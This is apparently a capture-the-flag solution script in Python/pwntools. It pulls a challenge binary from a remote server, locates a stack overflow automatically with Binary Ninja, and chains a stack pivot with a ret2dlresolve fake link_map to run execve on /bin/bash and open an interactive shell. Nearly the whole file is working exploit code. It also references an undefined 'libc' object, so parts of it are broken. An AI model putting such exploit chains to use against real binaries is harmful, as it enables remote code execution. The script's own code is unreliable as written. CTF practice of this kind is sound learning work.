from pwn import *
import binaryninja
from os import system
import random
import string

file_name = (''.join(random.choices(string.ascii_lowercase, k=10)))

binary_name = "tmp/" + file_name
r = remote("ctf.battelle.org",30042)
r.recvuntil(b"********************************")
binary = r.recvuntil(b"********************************").replace(b"********************************",b"")[1:]

with open(binary_name, 'wb') as f:
    f.write(binary)
system(f"chmod +x {binary_name}")


bv = binaryninja.open_view(binary_name)
bv.rebase(0x08048000)

# FIGURE THIS OUT
read = 0x80483d0
custom = []
for i in (bv.functions):
    if i.return_type.get_string() == 'int32_t':
        if "sub_" in i.name:
            custom.append(i)

for i in custom:
    try:
        read_size = ((list(i.high_level_il.instructions)[3]).params[-1].constant)
        memset_size = ((list(i.high_level_il.instructions)[2]).params[-1].constant)
        if read_size > memset_size:
            print("BOF FUNC FOUND")
            vuln = i
            break
    except Exception as e:
        pass
og_vuln = vuln

# def search_vuln():
# for i in custom:
#     try:
#         stack_size = list(i.instructions)[3][0][-1].value
#         read_size = list(i.instructions)[16][0][-1].value
#         if read_size > stack_size:
#             print("FOUND VULN")
#             vuln = i
#     except:
#         pass

func_list = []

while vuln.callers:
    func_list.append(vuln)
    vuln = vuln.callers[0]

#First ones main, will call game
func_list = func_list[::-1][1:]

inputs = []
for i in range(len(func_list) -1):
    if list(func_list[i].high_level_il.instructions)[7].operands[1].tokens[0].value == func_list[i+1].address_ranges[0].start:
        print("TAKE RIGHT, PASS")

        pointer = bv.read(list(func_list[i].high_level_il.instructions)[5].operands[0].operands[0].operands[1][0].operands[0].value.value , 4)
        addr = struct.unpack("<l",pointer )[0]
        string = b''
        while b'\x00' not in string:
            string += bv.read(addr+ len(string),1)
        print(string)
        inputs.append(string)

    elif list(func_list[i].high_level_il.instructions)[6].operands[1].tokens[0].value == func_list[i+1].address_ranges[0].start:
        print("TAKE LEFT, FAIL")
        inputs.append(b"ex4722")
    else:
        print("BROKE")

bof_size = abs(list(og_vuln.high_level_il.instructions)[1].var.storage)

# libc = ELF("./libc.so.6")
# libc = ELF("./remote_libc.so")
context.arch = 'i386'

exe = ELF(binary_name)
rop = ROP(binary_name)

gdbscript = r"""
set $link = *0x804b004
define ld_load
    x/2x $esp
    set $stack = $esp + 4
    set $i =  *((char **) ($stack))
    printf "AT %p is %d\n", $stack, $i
    x/2wx 0x08048320 + $i 
    printf "R_info: %p\n", *( 0x08048320 + $i +4)
    set $rinfo = *(int)( 0x08048320 + $i +4)
    set $rsym = $rinfo >> 8 
    printf "R_sym: %p\n", $rsym 
    set $sym = 0x080481cc + 0x10 * $rsym
    printf "SYM : %p\n", $sym 
    x/6wx $sym
    printf "STR_OFF: %p\n", *$sym 
    set $sym =  *$sym 
    printf "Symbol: %s\n", $sym + 0x0804826c
end
c
"""


def new_processes():
    p = process(binary_name)
    for i in inputs:
        p.send(i)
    return p

def new_debug():
    p = gdb.debug(binary_name,gdbscript=gdbscript)
    for i in inputs:
        p.send(i)
    return p


def remote_process():
    for i in inputs:
        r.send(i)
        r.clean()
    return r

p = remote_process()
# p = new_debug()

dl_resolve_func = 0x8048380
leave_ret = 0x08048cab

leave_ret = rop.find_gadget(["leave","ret"]).address 
stack_gad = rop.find_gadget(["pop ebx","pop esi", "pop edi", "pop ebp"]).address
ret = rop.find_gadget(["ret"]).address


# p = new_debug()

# Stack Piviot, read into fake stack, then jmp
fake_stack = exe.bss() + 0xd00
fake_stack2 = exe.bss() + 0xe00 
fake_link_map_addr = exe.bss() + 0x200 +8


payload = flat([ 
    b"A"*(bof_size),
    exe.plt.read,
    stack_gad,
    0, fake_stack, 0x400,
    # New EBP 
    fake_stack,
    # New RIP,pivot now
    leave_ret,
    ])

p.send(payload)
sleep(1)


jmprel = 0x08048320
symtab  = 0x080481cc
strtab  = 0x0804826c


jmp_offset = 0x1337

# fake_str = b"execve\x00\x00/bin/bash"

offset_2_addr = libc.symbols.execve - libc.symbols.__libc_start_main 

known_pointer = exe.got.__libc_start_main


def make_link_map(fake_addr, reloc_index, offset_2_addr, got_start_addr):
    """
    link_map 
        l_info 

    symtab( NOT NEEDED)
    jmptab
    strtab (NOT NEEDED)
    """
    map_size =  128

    fake_link_map = b'' 
    fake_link_map += p32(offset_2_addr)

    fake_link_map += fake_link_map.ljust(0x30, b'\x00') 

    # *strtab, pointer to pointer of strtab, NOT NEEDED
    fake_link_map += p32(exe.bss()) 

    # *symtab, pointer to pointer of symtab
    fake_link_map += p32(fake_addr + map_size ) 

    fake_link_map = fake_link_map.ljust(124, b'\x00') 

    # *jmptab, pointer to pointer of jmptab
    fake_link_map += p32(fake_addr + map_size+8) 


    return fake_link_map 


fake = make_link_map(fake_link_map_addr, 0, offset_2_addr, exe.got.__libc_start_main)

# Point symtab to got -8
fake += p32(6)
fake += p32(exe.got.__libc_start_main -4 )

# jmptab
fake += p32(17)
fake += p32(fake_link_map_addr + len(fake) + 4 -1)

# Offset + info
padding = 0
# r_info = (fake_link_map_addr + padding + 0x10 ) - 
# r_info = r_info // 0x10 
r_info = (0 << 8) | 0x7

fake_jmprel = p32(exe.bss() - offset_2_addr) + p32(r_info)

fake += fake_jmprel
fake += b"/bin/bash"



# Read in fake tables 
payload = flat([ 
    0xbeefbeef,
    exe.plt.read,
    stack_gad,
    0, fake_link_map_addr, 0x400,

    # New EBP, to instruction after lev_ret
    fake_stack + (7*4),
    # New RIP,pivot again to next instructin
    leave_ret,
    dl_resolve_func + 6,
    # LINK MAP
    fake_link_map_addr,
    # First entry of jmprel
    1,
    # execve ret addr
    0xdeadbeef,
    fake_link_map_addr + fake.index(b"/bin/bash"),
    0,0
    ])

print(p.clean())
p.send(payload)
print(p.clean())

# Send fake link_map
sleep(1)

input("BREAK")
p.send(fake)


p.interactive()
